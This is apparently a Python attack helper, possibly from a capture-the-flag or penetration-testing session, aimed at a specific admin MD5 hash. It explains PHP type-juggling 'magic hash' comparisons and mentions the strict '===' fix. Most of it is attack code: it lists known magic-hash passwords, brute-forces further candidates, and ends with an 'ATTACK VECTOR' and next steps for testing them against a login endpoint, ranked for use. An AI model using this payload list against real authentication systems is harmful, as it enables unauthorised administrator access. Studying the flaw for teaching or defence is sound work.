import hashlib
import re
import itertools

# 1. Analyze the admin hash
admin_hash = "0e678703625362188185747119782643"
print(f"[!] Admin hash: {admin_hash}")
print(f"[!] Hash length: {len(admin_hash)} characters")
print(f"[!] Starts with '0e': {admin_hash.startswith('0e')}")
print(f"[!] Next characters are all digits: {admin_hash[2:].isdigit()}")

# Verify MD5 format (32 hex chars)
is_md5 = len(admin_hash) == 32 and all(c in '0123456789abcdef' for c in admin_hash.lower())
print(f"[!] Valid MD5 format: {is_md5}")
print()

# 2. Explain PHP magic hash vulnerability
print("="*80)
print("PHP MAGIC HASH VULNERABILITY EXPLANATION")
print("="*80)
print("""
PHP Type Juggling Vulnerability:
When PHP uses == (loose comparison), strings matching scientific notation are
treated as numbers: "0e[digits]" becomes 0 × 10^N = 0.

Vulnerable comparison example:
  if (md5($password) == $stored_hash)  // Using == (BAD!)
  
If $stored_hash = "0e678703..." (all digits after 0e)
   ANY password with MD5 "0e[digits]" will match because:
   "0e123" == "0e456" → PHP converts both to 0 → TRUE

Secure comparison:
  if (md5($password) === $stored_hash)  // Using === (GOOD!)
""")

# 3. Known magic hash passwords for MD5
print("\n" + "="*80)
print("KNOWN MD5 MAGIC HASH PASSWORDS")
print("="*80)

# Common passwords known to produce "0e" MD5 hashes
known_magic_passwords = [
    "240610708",     # MD5: 0e462097431906509019562988736854
    "QNKCDZO",       # MD5: 0e830400451993494058024219903391
    "aabg7XSs",      # MD5: 0e087386482136013740957780965295
    "aabC9RqS",      # MD5: 0e041022518165728065344349536299
    "s878926199a",   # MD5: 0e545993274517709034328855841020
    "s155964671a",   # MD5: 0e342768416822451524974117254469
    "s214587387a",   # MD5: 0e848240448830537924465865611904
    "s1091221200a",  # MD5: 0e399584290069820987035018271304
    "s1885207154a",  # MD5: 0e509367213418206700842008763514
    "s1502113478a",  # MD5: 0e861580430291253726094265009191
    "s1836677006a",  # MD5: 0e481036490867661113260034900752
    "s1184209335a",  # MD5: 0e072485820392773389074313648581
    "s1665632922a",  # MD5: 0e731198061491163073197128363787
]

# Verify these produce 0e hashes and show them
magic_candidates = {}
for pwd in known_magic_passwords:
    md5_hash = hashlib.md5(pwd.encode()).hexdigest()
    if md5_hash.startswith('0e') and md5_hash[2:].isdigit():
        magic_candidates[pwd] = md5_hash
        print(f"[+] Password: {pwd:20s} → MD5: {md5_hash}")

print(f"\n[!] Found {len(magic_candidates)} passwords producing magic MD5 hashes")

# 4. Check if any match the admin hash
print("\n" + "="*80)
print("CHECKING FOR EXACT MATCH WITH ADMIN HASH")
print("="*80)
admin_matched = False
for pwd, hash_val in magic_candidates.items():
    if hash_val == admin_hash:
        print(f"[!] EXACT MATCH FOUND!")
        print(f"[!] Password: {pwd}")
        print(f"[!] Hash: {hash_val}")
        print(f"[!] This password should grant admin access!")
        admin_matched = True
        break

if not admin_matched:
    print(f"[-] No exact match found for admin hash: {admin_hash}")
    print(f"[!] But ANY of these {len(magic_candidates)} passwords may work due to PHP type juggling!")
    print(f"[!] The admin hash is: {admin_hash}")
    print(f"[!] If the app uses == comparison, these will ALL match:")
    for pwd in list(magic_candidates.keys())[:5]:
        print(f"    - {pwd}")

# 5. Try to find more magic hash candidates
print("\n" + "="*80)
print("GENERATING ADDITIONAL MAGIC HASH CANDIDATES")
print("="*80)

# Check common patterns
test_patterns = [
    "240610708",  # Known base
    "s878926199a", # Pattern with 's' and 'a'
    "s155964671a",
    "QNKCDZO",    # Alphanumeric
]

additional_candidates = {}
print("[+] Testing variations of known patterns...")

for base in test_patterns[:2]:
    # Try adding numbers at the end
    for i in range(10):
        test_pwd = f"{base}{i}"
        md5_hash = hashlib.md5(test_pwd.encode()).hexdigest()
        if md5_hash.startswith('0e') and md5_hash[2:].isdigit():
            additional_candidates[test_pwd] = md5_hash
            print(f"[+] New candidate: {test_pwd:25s} → {md5_hash}")
    
    # Try changing last character
    if len(base) > 1:
        for char in '0123456789abcdefghijklmnopqrstuvwxyz':
            test_pwd = base[:-1] + char
            md5_hash = hashlib.md5(test_pwd.encode()).hexdigest()
            if md5_hash.startswith('0e') and md5_hash[2:].isdigit():
                additional_candidates[test_pwd] = md5_hash
                print(f"[+] New candidate: {test_pwd:25s} → {md5_hash}")

all_magic_passwords = {**magic_candidates, **additional_candidates}
print(f"\n[!] Total magic hash passwords found: {len(all_magic_passwords)}")

# 6. Summary
print("\n" + "="*80)
print("RESEARCH SUMMARY")
print("="*80)
print(f"""
KEY FINDINGS:
=============
1. Hash Type: MD5 (32 hex characters, length verified)
2. Magic Hash Pattern: '0e' followed by all digits
3. Admin Hash: {admin_hash}
4. Vulnerability: PHP type juggling if using == comparison
5. Available Magic Passwords: {len(all_magic_passwords)} unique passwords

ATTACK VECTOR:
==============
If the authentication uses loose comparison (==):
  md5($input) == "0e678703625362188185747119782643"
  
Then ANY of these passwords will authenticate successfully:
""")

for i, pwd in enumerate(list(all_magic_passwords.keys())[:10], 1):
    print(f"  {i}. {pwd}")

print(f"""
TOTAL CANDIDATES COLLECTED: {len(all_magic_passwords)}

NEXT STEPS:
===========
1. Test all magic hash passwords against the authentication endpoint
2. If authentication fails, the app may be using === (strict comparison)
3. Consider other hash algorithms (SHA1 also has magic hashes)
4. Test rate limiting and account lockout policies
""")

# 7. Prepare sorted list for authentication testing
sorted_passwords = sorted(all_magic_passwords.items(), key=lambda x: len(x[0]))
print("\n[READY FOR TESTING]")
print("Best candidates to test first (shortest passwords):")
for pwd, hash_val in sorted_passwords[:10]:
    print(f"  - Password: {pwd:20s} | Hash: {hash_val}")
